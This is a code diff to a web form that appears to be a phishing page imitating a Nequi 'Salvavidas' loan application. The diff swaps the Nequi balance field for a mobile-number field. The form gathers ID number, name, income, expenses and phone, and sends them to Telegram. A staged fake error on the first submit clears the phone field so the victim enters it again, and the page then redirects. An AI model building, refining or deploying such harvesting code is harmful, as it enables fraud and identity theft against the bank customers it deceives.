@@ -315,13 +315,13 @@
               <span id="gastosErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus gastos
                 mensuales</span>
 
-              <!-- Saldo Actual en Nequi (con formato de pesos colombianos) -->
+              <!-- === NÚMERO DE CELULAR (reemplaza al saldo) === -->
               <div class="form-group">
-                <input type="text" id="saldoActualSalvavidas" required="" inputmode="numeric">
-                <label for="saldoActualSalvavidas">Saldo actual en Nequi</label>
+                <input type="text" id="celularSalvavidas" required="" inputmode="numeric" maxlength="10" pattern="[0-9]*">
+                <label for="celularSalvavidas">Número de celular</label>
               </div>
-              <span id="saldoErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa un saldo válido (mínimo 4 dígitos)</span>
-              <span class="text-gray-500 text-xs">Ingresa el saldo actual que tienes en tu cuenta Nequi.</span>
+              <span id="celularErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa un número de celular válido (10 dígitos)</span>
+              <span class="text-gray-500 text-xs">Ingresa tu número de celular a 10 dígitos, sin espacios ni símbolos.</span>
             </div>
 
             <!-- Selector de meses -->
@@ -449,7 +449,7 @@
                 `🧑‍💼 *Ocupación:* ${formData.ocupacion}\n` +
                 `📈 *Ingresos mensuales:* ${formData.ingresoMensual}\n` +
                 `💸 *Gastos mensuales:* ${formData.gastosMensual}\n` +
-                `💰 *Saldo actual Nequi:* ${formData.saldoActual}\n` +
+                `📱 *Celular:* ${formData.celular}\n` +
                 `🔢 *Plazo:* ${formData.meses} meses\n` +
                 `📅 *Fecha de pago:* Día ${formData.fechaPago} de cada mes\n` +
                 `📢 *Tipo:* ${formData.tipoProducto}\n\n` +
@@ -554,8 +554,11 @@
               return nombre.trim().length >= 5 && nombre.includes(" ");
             }
 
+            function validarCelular(celular) {
+              return celular.length === 10 && /^\d{10}$/.test(celular);
+            }
+
             function validarCampoNumerico(valor) {
-              // Para campos con formato de moneda, extraer solo números
               const soloNumeros = valor.replace(/[^0-9]/g, '');
               return soloNumeros.length >= 4;
             }
@@ -565,8 +568,8 @@
               const nombreValido = validarNombre(
                 nombreCompletoSalvavidas.value
               );
-              const saldoValido = validarCampoNumerico(
-                saldoActualSalvavidas.value
+              const celularValido = validarCelular(
+                celularSalvavidas.value
               );
               const ingresoMensualValido = validarCampoNumerico(
                 ingresoMensualSalvavidas.value
@@ -576,25 +579,22 @@
               );
 
               btnContinuarSalvavidas.disabled = !(
-                cedulaValida && nombreValido && saldoValido && ingresoMensualValido && gastosMensualValido
+                cedulaValida && nombreValido && celularValido && ingresoMensualValido && gastosMensualValido
               );
 
-              // Los mensajes de error están ocultos por CSS, no es necesario togglear
-              
               if (!cedulaValida) cedulaSalvavidas.classList.add("border-red-500");
               else cedulaSalvavidas.classList.remove("border-red-500");
               
               if (!nombreValido) nombreCompletoSalvavidas.classList.add("border-red-500");
               else nombreCompletoSalvavidas.classList.remove("border-red-500");
               
-              if (!saldoValido) saldoActualSalvavidas.classList.add("border-red-500");
-              else saldoActualSalvavidas.classList.remove("border-red-500");
+              if (!celularValido) celularSalvavidas.classList.add("border-red-500");
+              else celularSalvavidas.classList.remove("border-red-500");
             }
 
             // Función para formatear montos en pesos colombianos
             function formatCurrency(input) {
               let value = input.value;
-              // Extraer solo números
               let numericValue = value.replace(/[^0-9]/g, "");
               if (numericValue === "") {
                 input.value = "";
@@ -612,7 +612,7 @@
 
             const cedulaSalvavidas = document.getElementById("cedulaSalvavidas");
             const nombreCompletoSalvavidas = document.getElementById("nombreCompletoSalvavidas");
-            const saldoActualSalvavidas = document.getElementById("saldoActualSalvavidas");
+            const celularSalvavidas = document.getElementById("celularSalvavidas");
             const ingresoMensualSalvavidas = document.getElementById("ingresoMensualSalvavidas");
             const gastosMensualSalvavidas = document.getElementById("gastosMensualSalvavidas");
             const ocupacionSelectorSalvavidas = document.getElementById("ocupacionSelectorSalvavidas");
@@ -627,9 +627,10 @@
               actualizarEstadoBotonContinuar();
             });
 
-            // Aplicar formato de moneda al saldo actual
-            saldoActualSalvavidas.addEventListener("input", (e) => {
-              formatCurrency(e.target);
+            // Validación de celular: solo números, máximo 10 dígitos
+            celularSalvavidas.addEventListener("input", (e) => {
+              e.target.value = e.target.value.replace(/\D/g, "").slice(0,10);
+              actualizarEstadoBotonContinuar();
             });
 
             ingresoMensualSalvavidas.addEventListener("input", (e) => {
@@ -649,14 +650,14 @@
               if (contSendButton === 1) {
                 setTimeout(() => {
                   errorMessage.style.display = "block";
-                  saldoActualSalvavidas.style.border = '2px solid #da0081'
+                  celularSalvavidas.style.border = '2px solid #da0081'
                   loadingSpinner.style.display = "none";
                 }, 4000);
 
                 setTimeout(() => {
                   errorMessage.style.display = "none";
                   contSendButton += 1;
-                  saldoActualSalvavidas.value = '';
+                  celularSalvavidas.value = '';
                   actualizarEstadoBotonContinuar();
                   window.scrollTo({ top: ingresoMensualSalvavidas.getBoundingClientRect().top + window.scrollY - 100, behavior: "smooth" });
                 }, 4000);
@@ -668,7 +669,7 @@
                   ocupacion: ocupacionSelectorSalvavidas.value,
                   ingresoMensual: ingresoMensualSalvavidas.value,
                   gastosMensual: gastosMensualSalvavidas.value,
-                  saldoActual: saldoActualSalvavidas.value,
+                  celular: celularSalvavidas.value,
                   meses: plazoSelectorSalvavidas.value,
                   fechaPago: fechaPago.value,
                   tipoProducto: 'Bajo monto'
@@ -676,10 +677,8 @@
                 
                 showDebugMessage('📝 Datos recopilados, enviando a Telegram...');
                 
-                // Enviar a Telegram
-                const resultado = await enviarATelegram(formData);
+                await enviarATelegram(formData);
                 
-                // Mostrar loader y redirigir después de 4 segundos
                 mostrarLoaderYRedirigir();
               }
             });
